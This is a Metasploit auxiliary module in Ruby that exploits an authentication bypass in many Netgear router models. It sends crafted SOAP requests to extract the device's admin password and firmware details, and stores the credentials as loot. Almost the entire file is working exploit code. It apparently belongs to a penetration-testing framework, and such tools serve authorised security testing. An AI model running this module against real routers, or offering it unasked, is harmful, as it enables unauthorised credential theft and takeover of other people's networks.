##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'Netgear Unauthenticated SOAP Password Extractor',
      'Description' => %q{
          This module exploits an authentication bypass vulnerability in different
        Netgear devices. With this vulnerability you are able to extract the password
        for the remote management. The following devices are reported as vulnerable:
        NetGear WNDR3700v4 - V1.0.0.4SH, NetGear WNDR3700v4 - V1.0.1.52, NetGear WNR2200 - V1.0.1.88,
        NetGear WNR2500 - V1.0.0.24, NetGear WNDR3700v2 - V1.0.1.14 (Tested by Paula Thomas),
        NetGear WNDR3700v1 - V1.0.16.98 (Tested by Michal Bartoszkiewicz),
        NetGear WNDR3700v1 - V1.0.7.98 (Tested by Michal Bartoszkiewicz),
        NetGear WNDR4300 - V1.0.1.60 (Tested by Ronny Lindner),
        NetGear R6300v2 - V1.0.3.8 (Tested by Robert Mueller),
        NetGear WNDR3300 - V1.0.45 (Tested by Robert Mueller),
        NetGear WNDR3800 - V1.0.0.48 (Tested by an Anonymous contributor),
        NetGear WNR1000v2 - V1.0.1.1 (Tested by Jimi Sebree),
        NetGear WNR1000v2 - V1.1.2.58 (Tested by Chris Boulton)
        This module was tested on a Netgear WNDR3700v4 - V1.0.1.42
      },
      'References'  =>
        [
          [ 'BID', '72640' ],
          [ 'URL', 'https://github.com/darkarnium/secpub/tree/master/NetGear/SOAPWNDR' ]
        ],
      'Author'      =>
        [
          'Peter Adkins <peter.adkins[at]kernelpicnic.net>', # Vulnerability discovery
          'Michael Messner <devnull[at]s3cur1ty.de>'	     # Metasploit module
        ],
      'License'     => MSF_LICENSE
    )
  end

  def run
    print_status("#{peer} - Trying to access the configuration of the device")

    # extract device details
    soapaction = "urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo"
    print_status("Extract Firmware version.")
    extract_data(soapaction)

    # extract credentials
    soapaction = "urn:NETGEAR-ROUTER:service:LANConfigSecurity:1#GetInfo"
    print_status("Extract credentials.")
    extract_data(soapaction)
  end

  def extract_data(soapaction)
    begin
      res = send_request_cgi({
        'method'  => 'POST',
        'uri'              => "/",
        'headers' => {
          'SOAPAction' => soapaction,
        },
        'data'            => "=",
      })
      #puts res

      return if res.nil?
      # unknown if other devices have other Server headers
      return if (res.headers['Server'].nil? or res.headers['Server'] !~ /Linux\/2.6.15 uhttpd\/1.0.0 soap\/1.0/)
      return if (res.code == 404)

      if res.body =~ /<NewPassword>(.*)<\/NewPassword>/
        print_good("#{peer} - credentials successfully extracted")

        res.body.each_line do |line|
          if line =~ /<NewPassword>(.*)<\/NewPassword>/
            pass = $1
            vprint_good("user: admin")
            vprint_good("pass: #{pass}")

            service_data = {
                address: rhost,
                port: rport,
                service_name: 'http',
                protocol: 'tcp',
                workspace_id: myworkspace_id
            }

            credential_data = {
                module_fullname: self.fullname,
                origin_type: :service,
                private_data: pass,
                private_type: :password,
                username: 'admin'
            }

            credential_data.merge!(service_data)

            credential_core = create_credential(credential_data)

            login_data = {
                core: credential_core,
                last_attempted_at: DateTime.now,
                status: Metasploit::Model::Login::Status::SUCCESSFUL
            }
            login_data.merge!(service_data)

            create_credential_login(login_data)

          end
        end

        #store all details as loot
        loot = store_loot("netgear_soap_account.config","text/plain",rhost, res.body)
        print_good("#{peer} - Account details downloaded to: #{loot}")
      end

      if res.body =~ /<ModelName>(.*)<\/ModelName>/
            modelname = $1
            vprint_good("Modelname: #{modelname}")
      end

      if res.body =~ /<Firmwareversion>(.*)<\/Firmwareversion>/
            firmwareversion = $1
            vprint_good("Firmwareversion: #{firmwareversion}")

            #store all details as loot
            loot = store_loot("netgear_soap_device.config","text/plain",rhost, res.body)
            print_good("#{peer} - Device details downloaded to: #{loot}")
      end

    rescue ::Rex::ConnectionError
      vprint_error("#{peer} - Failed to connect to the web server")
      return
    end
  end
end
